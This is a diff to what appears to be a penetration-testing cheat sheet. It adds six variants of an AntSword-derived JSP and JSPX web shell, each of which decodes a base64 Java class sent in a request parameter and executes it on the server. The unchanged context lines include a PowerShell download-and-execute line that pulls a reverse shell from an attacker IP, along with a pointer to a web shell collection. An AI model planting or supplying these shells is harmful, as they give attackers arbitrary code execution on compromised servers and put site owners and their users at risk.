@@ -196,6 +196,213 @@ p.waitFor()
 
 ---
 
+## JSP
+
+- Extracted from [AntSwordProject](https://github.com/AntSwordProject/AntSword-JSP-Template/blob/master/web/shell.jsp)
+
+- Option 1:
+
+```jsp
+<%!
+    class U extends ClassLoader {
+        U(ClassLoader c) {
+            super(c);
+        }
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+
+    public byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception e) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+        }
+    }
+%>
+<%
+    String cls = request.getParameter("ant");
+    if (cls != null) {
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+    }
+%>
+```
+
+- Option 2:
+
+```jsp
+<%!
+    class U extends ClassLoader {
+        U(ClassLoader c) {
+            super(c);
+        }
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+
+    public byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception e) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+        }
+    }
+%>
+<%
+    String cls = request.getParameter("ant");
+    if (cls != null) {
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(request);
+    }
+%>
+```
+
+- Option 3:
+
+```jsp
+<%!
+    class U extends ClassLoader {
+        U(ClassLoader c) {
+            super(c);
+        }
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+
+    public byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception e) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+        }
+    }
+%>
+<%
+    String cls = request.getParameter("ant");
+    if (cls != null) {
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
+    }
+%>
+```
+
+---
+
+## JSPX
+
+- Extracted from [AntSwordProject](https://github.com/AntSwordProject/AntSword-JSP-Template/blob/master/web/shell.jspx)
+
+- Option 1:
+
+```jspx
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
+    <jsp:declaration>
+        class U extends ClassLoader {
+            U(ClassLoader c) {
+                super(c);
+            }
+            public Class g(byte[] b) {
+                return super.defineClass(b, 0, b.length);
+            }
+        }
+        public byte[] base64Decode(String str) throws Exception {
+            try {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+            } catch (Exception e) {
+                Class clazz = Class.forName("java.util.Base64");
+                Object decoder = clazz.getMethod("getDecoder").invoke(null);
+                return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            }
+        }
+    </jsp:declaration>
+    <jsp:scriptlet>
+        String cls = request.getParameter("ant");
+        if (cls != null) {
+            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+        }
+    </jsp:scriptlet>
+</jsp:root>
+```
+
+- Option 2:
+
+```jspx
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
+    <jsp:declaration>
+        class U extends ClassLoader {
+            U(ClassLoader c) {
+                super(c);
+            }
+            public Class g(byte[] b) {
+                return super.defineClass(b, 0, b.length);
+            }
+        }
+        public byte[] base64Decode(String str) throws Exception {
+            try {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+            } catch (Exception e) {
+                Class clazz = Class.forName("java.util.Base64");
+                Object decoder = clazz.getMethod("getDecoder").invoke(null);
+                return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            }
+        }
+    </jsp:declaration>
+    <jsp:scriptlet>
+        String cls = request.getParameter("ant");
+        if (cls != null) {
+            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(request);
+        }
+    </jsp:scriptlet>
+</jsp:root>
+```
+
+- Option 3:
+
+```jspx
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
+    <jsp:declaration>
+        class U extends ClassLoader {
+            U(ClassLoader c) {
+                super(c);
+            }
+            public Class g(byte[] b) {
+                return super.defineClass(b, 0, b.length);
+            }
+        }
+        public byte[] base64Decode(String str) throws Exception {
+            try {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+            } catch (Exception e) {
+                Class clazz = Class.forName("java.util.Base64");
+                Object decoder = clazz.getMethod("getDecoder").invoke(null);
+                return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            }
+        }
+    </jsp:declaration>
+    <jsp:scriptlet>
+        String cls = request.getParameter("ant");
+        if (cls != null) {
+            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
+        }
+    </jsp:scriptlet>
+</jsp:root>
+```
+
+---
+
 - If you see that running `sudo -l` someone is using a wildcard like:
 
 ![](Pasted%20image%2020240210151540.png)
@@ -819,6 +1026,8 @@ PowerShell "IEX(New-Object Net.WebClient).downloadString('http://IP_ATTACK/rev.p
 ---
 
 ## Web shell
+
+- *Highly recommendable to check [Tennc compilation](https://github.com/tennc/webshell)*
 
 - Create a `web_shell.php` file with this content:
 
